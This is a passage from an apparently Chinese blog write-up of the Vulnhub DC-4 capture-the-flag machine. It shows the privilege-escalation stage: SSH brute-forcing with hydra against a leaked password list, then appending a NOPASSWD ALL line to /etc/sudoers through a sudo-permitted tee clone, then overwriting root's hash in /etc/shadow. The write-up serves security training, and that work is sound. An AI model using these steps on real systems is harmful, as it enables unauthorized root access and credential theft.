class=\"hljs-number\"\u003e45602\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:/usr/share/nginx/html$ whoami\nwww-data\n//\nwww-data@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:/usr/share/nginx/html$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) gid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) groups=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data)\n//\nwww-data@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:/usr/share/nginx/html$ uname -a\nLinux dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e4.9\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e686\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e#1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查找敏感文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:/usr/share/nginx/html$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null\nfind / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/gpasswd\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chfn\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudo\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chsh\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/newgrp\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/passwd\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e/dbus-daemon-launch-helper\n/usr/sbin/exim4\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mount\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/umount\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/su\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/ping\n/home/jim/test.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现一个存在可执行文件\u003ccode\u003etest.sh\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看\u003ccode\u003etest.sh\u003c/code\u003e内容，应该提示该目录下有东西什么的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:/home/jim$ cat test.sh\n//\n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e {\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e}\ndo\n sleep \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n echo \u003cspan class=\"hljs-string\"\u003e\"Learn bash they said.\"\u003c/span\u003e\n sleep \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n echo \u003cspan class=\"hljs-string\"\u003e\"Bash is good they said.\"\u003c/span\u003e\ndone\n echo \u003cspan class=\"hljs-string\"\u003e\"But I'd rather bash my head against a brick wall.\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e进行查看\u003ccode\u003ejim\u003c/code\u003e目录下的文件，目录下的\u003ccode\u003embox\u003c/code\u003e文件没访问权限，在\u003ccode\u003ebackups\u003c/code\u003e目录下找到\u003ccode\u003eold-passwords.bak\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:/home/jim/backups$ cat old-passwords.bak\ncat old-passwords.bak\n\u003cspan class=\"hljs-number\"\u003e000000\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e12345\u003c/span\u003e\niloveyou\n1q2w3e4r5t\n\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\n123456a\n\n...........\n\nsvetlana\nfatima\n123456k\nicecream\npopcorn1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e是很多的的密码，我们拿去爆破\u003ccode\u003essh\u003c/code\u003e用户\u003ccode\u003ejim\u003c/code\u003e ，将内容保存为\u003ccode\u003epasswd\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用hydra爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e hydra -l jim -P passwd -vV -e ns \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e ssh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e][ssh] host: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e   login: jim   password: jibril04\n[STATUS] attack finished \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.173\u003c/span\u003e (waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e children to complete tests)\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e target successfully completed, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e valid password found\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e破解出用户\u003ccode\u003ejim\u003c/code\u003e密码\u003ccode\u003ejibril04\u003c/code\u003e ，其实也可以用来尝试破解\u003ccode\u003eroot\u003c/code\u003e用户，不过没破解出来\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e登录\u003ccode\u003ejim\u003c/code\u003e用户,查看权限\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e没有相关\u003ccode\u003esudo\u003c/code\u003e权限\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看当前目录下的\u003ccode\u003embox\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eFrom root@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e Sat Apr 06 \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:04 \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e\nReturn-path: \u0026#x3C;root@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\u003e\nEnvelope-to: jim@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\nDelivery-date: Sat, 06 Apr \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:04 +\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\nReceived: \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e root by dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e local (Exim \u003cspan class=\"hljs-number\"\u003e4.89\u003c/span\u003e)\n        (envelope-\u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u0026#x3C;root@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\u003e)\n        \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e 1hCiQe-0000gc-EC\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e jim@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e; Sat, 06 Apr \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:04 +\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\nTo: jim@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\nSubject: Test\nMIME-Version: \u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: text/plain; charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\nContent-Transfer-Encoding: 8bit\nMessage-Id: \u0026#x3C;E1hCiQe-0000gc-EC@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\u003e\nFrom: root \u0026#x3C;root@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\u003e\nDate: Sat, 06 Apr \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:04 +\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\nStatus: RO\n\nThis \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e a test.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e是一封来自\u003ccode\u003eroot\u003c/code\u003e的文件，跟着邮件这个线索，我们去翻邮件\u003ccode\u003e/var/mail\u003c/code\u003e 存在一封\u003ccode\u003ejim\u003c/code\u003e的邮件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eFrom charles@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e Sat Apr 06 \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e\nReturn-path: \u0026#x3C;charles@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\u003e\nEnvelope-to: jim@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\nDelivery-date: Sat, 06 Apr \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e +\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\nReceived: \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e charles by dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e local (Exim \u003cspan class=\"hljs-number\"\u003e4.89\u003c/span\u003e)\n        (envelope-\u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u0026#x3C;charles@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\u003e)\n        \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e 1hCjIX-0000kO-Qt\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e jim@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e; Sat, 06 Apr \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e +\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\nTo: jim@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\nSubject: Holidays\nMIME-Version: \u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: text/plain; charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\nContent-Transfer-Encoding: 8bit\nMessage-Id: \u0026#x3C;E1hCjIX-0000kO-Qt@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\u003e\nFrom: Charles \u0026#x3C;charles@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\u003e\nDate: Sat, 06 Apr \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e +\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\nStatus: O\n\nHi Jim,\n\nI\u003cspan class=\"hljs-string\"\u003e'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.\n\nPassword is:  ^xHhA\u0026#x26;hvim0y\n\nSee ya,\nCharles\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e告诉我们\u003ccode\u003eCharles\u003c/code\u003e的密码是\u003ccode\u003e^xHhA\u0026#x26;hvim0y\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e登录\u003ccode\u003echarles\u003c/code\u003e用户，查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003echarles@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:~$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e charles on dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser charles may run the following commands on dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:\n    (root) NOPASSWD: /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/teehee\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在有sudo权限的\u003ccode\u003eteehee\u003c/code\u003e 命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003echarles@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e$ sudo teehee --\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e\nUsage: teehee [OPTION]... [FILE]...\nCopy standard \u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e to each FILE, \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e also to standard output.\n\n  -a, --append              append to the given FILEs, do \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e overwrite\n  -i, --ignore-interrupts   ignore interrupt signals\n  -p                        diagnose errors writing to non pipes\n      --output-error[=MODE]   \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e behavior on write error.  See MODE below\n      --\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e     display this \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e exit\n      --version  output version information \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e exit\n\nMODE determines behavior \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e write errors on the outputs:\n  \u003cspan class=\"hljs-string\"\u003e'warn'\u003c/span\u003e         diagnose errors writing to \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e output\n  \u003cspan class=\"hljs-string\"\u003e'warn-nopipe'\u003c/span\u003e  diagnose errors writing to \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e output \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e a pipe\n  \u003cspan class=\"hljs-string\"\u003e'exit'\u003c/span\u003e         exit on error writing to \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e output\n  \u003cspan class=\"hljs-string\"\u003e'exit-nopipe'\u003c/span\u003e  exit on error writing to \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e output \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e a pipe\nThe default MODE \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the -p option \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'warn-nopipe'\u003c/span\u003e.\nThe default operation when --output-error \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e specified, \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e to\nexit immediately on error writing to a pipe, \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e diagnose errors\nwriting to non pipe outputs.\n\nGNU coreutils online \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e: \u0026#x3C;http://www.gnu.org/software/coreutils/\u003e\nFull documentation at: \u0026#x3C;http://www.gnu.org/software/coreutils/tee\u003e\n\u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e available locally via: info \u003cspan class=\"hljs-string\"\u003e'(coreutils) tee invocation'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eteehee\u003c/code\u003e提权，直接给用户\u003ccode\u003esudo all nopasswd\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eecho \u003cspan class=\"hljs-string\"\u003e\"charles ALL=(ALL) NOPASSWD: ALL\"\u003c/span\u003e | sudo teehee -a /etc/sudoers\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后修改\u003ccode\u003eshadow\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esudo nano /etc/shadow\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将当前用户\u003ccode\u003echarles\u003c/code\u003e的密码覆盖\u003ccode\u003eroot\u003c/code\u003e账户的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\nroot:$\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e$C7nromw2$HB4uMhUmb.srv.I.Q00bT/SV3fxgphbarSb4A8B0aI6kPGOy6WKrKJk.ckCfMLuO6H4uqGx68ylJcmB5ezJ.r0:\u003cspan class=\"hljs-number\"\u003e17992\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e99999\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:::\n.......\ncharles:$\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e$C7nromw2$HB4uMhUmb.srv.I.Q00bT/SV3fxgphbarSb4A8B0aI6kPGOy6WKrKJk.ckCfMLuO6H4uqGx68ylJcmB5ezJ.r0:\u003cspan class=\"hljs-number\"\u003e17992\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e99999\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:::\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003esu\u003c/code\u003e切换到\u003ccode\u003eroot\u003c/code\u003e ，使用\u003ccode\u003echarles\u003c/code\u003e的密码\u003ccode\u003e^xHhA\u0026#x26;hvim0y\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003echarles@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:~$ su root\nPassword: \nroot@dc-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:/home/charles\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e提权成功！读取\u003ccode\u003eflag\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# root@dc-4:~# cat flag.txt\u003c/span\u003e\n\n\u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e       \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e          \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e      8888888b.                             \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \n\u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e   o   \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e          \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-string\"\u003e\"Y88b                            888 888 888 888 \n888  d8b  888          888 888      888    888                            888 888 888 888 \n888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 \n888d88888b888 d8P  Y8b 888 888      888    888 d88\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"88b 888 \"\u003c/span\u003e88b d8P  Y8b \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \n88888P Y88888 \u003cspan class=\"hljs-number\"\u003e88888888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e    \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e88888888\u003c/span\u003e Y8P Y8P Y8P Y8P \n8888P   Y8888 Y8b.     \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  .d88P Y88.\u003cspan class=\"hljs-number\"\u003e.88\u003c/span\u003eP \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e Y8b.      \u003cspan class=\"hljs-string\"\u003e\"   \"\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003e\"   \"\u003c/span\u003e  \n888P     Y888  \u003cspan class=\"hljs-string\"\u003e\"Y8888  888 888      8888888P\"\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003e\"Y88P\"\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-string\"\u003e\"Y8888  888 888 888 888 \n\nCongratulations!!!\n\nHope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those\nwho have provided feedback, and who have taken time to complete these little\nchallenges.\n\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"Vulnhub - DC-4","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"DC-4\n\n https://www.vulnhub.com/entry/dc-4,313/\n \n\n主机发现端口扫描\n\n1. 探测存活主机，`173`是靶机\n    \n    \n    \n2. 扫描靶机所有开放端口\n    \n    \n    \n3. 扫描服务版本及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n\nweb渗透\n\n1. 访问页面，显示`Admin..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"02","id":"VulnhubDC-4"},"buildId":"-UtzH07gHiBcLmgvXOgKo","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>